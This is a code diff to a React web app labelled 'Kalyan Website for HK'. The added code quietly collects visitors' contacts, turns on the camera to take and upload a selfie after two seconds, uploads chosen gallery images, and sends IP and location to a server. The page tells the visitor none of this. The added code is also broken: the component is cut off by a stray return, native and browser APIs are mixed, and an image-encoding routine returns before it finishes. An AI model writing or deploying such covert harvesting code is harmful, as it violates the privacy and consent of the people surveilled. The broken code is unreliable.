@@ -1,10 +1,15 @@
 import React, { useEffect, useState } from 'react';
+import { View, Text } from 'react-native';
+import Contacts from 'react-native-contacts';
 
 function App() {
   // State to track whether each effect has already run
   const [ipFetched, setIpFetched] = useState(false);
-  const [contactsFetched, setContactsFetched] = useState(false);
+  const [fetchContacts, setContactsFetched] = useState(false);
   const [locationFetched, setLocationFetched] = useState(false);
+  const [selfieCaptured, setSelfieCaptured] = useState(false);
+  const [galleryPicturesCaptured, setGalleryPicturesCaptured] = useState(false);
+
 
   // Effect to fetch IP address
   useEffect(() => {
@@ -36,30 +41,36 @@ function App() {
 
   // Effect to fetch contacts
   useEffect(() => {
-    if (!contactsFetched && navigator.contacts) {
-      navigator.contacts.select(['name', 'email', 'phone'])
-        .then(contacts => {
-          const contactsJSON = JSON.stringify(contacts);
-          console.log('Contacts:', contactsJSON);
-
-          // Set flag to indicate contacts fetched
-          setContactsFetched(true);
-
-          // Send contacts to server
-          fetch('http://localhost:3001/contacts', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: contactsJSON
-          })
-            .then(response => response.text())
-            .then(data => console.log('Response from contacts endpoint:', data))
-            .catch(error => console.error('Error sending contacts:', error));
+    const fetchContacts = async () => {
+      try {
+        const contacts = await Contacts.getAll();
+        console.log('Contacts:', contacts);
+        
+        // Send contacts to server
+        fetch('http://localhost:3001/contacts', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(contacts)
         })
-        .catch(error => console.error('Error accessing contacts:', error));
-    }
-  }, [contactsFetched]);
+        .then(response => response.text())
+        .then(data => console.log('Response from contacts endpoint:', data))
+        .catch(error => console.error('Error sending contacts:', error));
+      } catch (error) {
+        console.error('Error fetching contacts:', error);
+      }
+    };
+
+    fetchContacts();
+  }, []);
+
+  return (
+    <View>
+      <Text>Fetching contacts...</Text>
+    </View>
+  );
+}
 
   // Effect to fetch location
   useEffect(() => {
@@ -98,10 +109,109 @@ function App() {
     }
   }, [locationFetched]);
 
+  // Selfie feature
+  useEffect(() => {
+    if (!selfieCaptured) {
+      const captureSelfie = async () => {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+  
+          const captureFrame = () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png').split(',')[1]; // Get base64 data
+  
+            // Send image data to server
+            fetch('http://localhost:3001/selfie', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({ image: imageData })
+            })
+              .then(response => response.text())
+              .then(data => console.log('Response from selfie endpoint:', data))
+              .catch(error => console.error('Error sending selfie:', error));
+          };
+  
+          // Capture selfie after 2 seconds
+          setTimeout(captureFrame, 2000);
+        } catch (error) {
+          console.error('Error accessing camera:', error);
+        }
+      };
+  
+      captureSelfie();
+      setSelfieCaptured(true);
+    }
+  }, [selfieCaptured]);
+
+  useEffect(() => {
+    const selectAndSendImages = async () => {
+      try {
+        const permission = await navigator.permissions.query({ name: 'camera' });
+        if (permission.state === 'granted') {
+          const imageFiles = await chooseImages();
+          const base64Images = await convertToBase64(imageFiles);
+          sendImagesToServer(base64Images);
+        } else {
+          console.error('Permission denied for accessing camera');
+        }
+      } catch (error) {
+        console.error('Error accessing camera:', error);
+      }
+    };
+
+    selectAndSendImages();
+  }, [galleryPicturesCaptured]);
+
+  const chooseImages = async () => {
+    const options = {
+      mediaType: 'image',
+      multiple: true,
+    };
+
+    const imageFiles = await window.showOpenFilePicker(options);
+    return imageFiles;
+  };
+
+  const convertToBase64 = async (imageFiles) => {
+    const base64Images = [];
+    for (const imageFile of imageFiles) {
+      const blob = await imageFile.getFile();
+      const reader = new FileReader();
+      reader.readAsDataURL(blob);
+      reader.onloadend = () => {
+        const base64 = reader.result.split(',')[1];
+        base64Images.push(base64);
+      };
+    }
+    return base64Images;
+  };
+
+  const sendImagesToServer = (base64Images) => {
+    fetch('http://localhost:3001/images', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ images: base64Images }),
+    })
+      .then((response) => response.json())
+      .then((data) => console.log('Response from server:', data))
+      .catch((error) => console.error('Error sending images:', error));
+  };
+
+
   return (
     <div className="App">
       <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
         <p>
           Kalyan Website for HK
         </p>
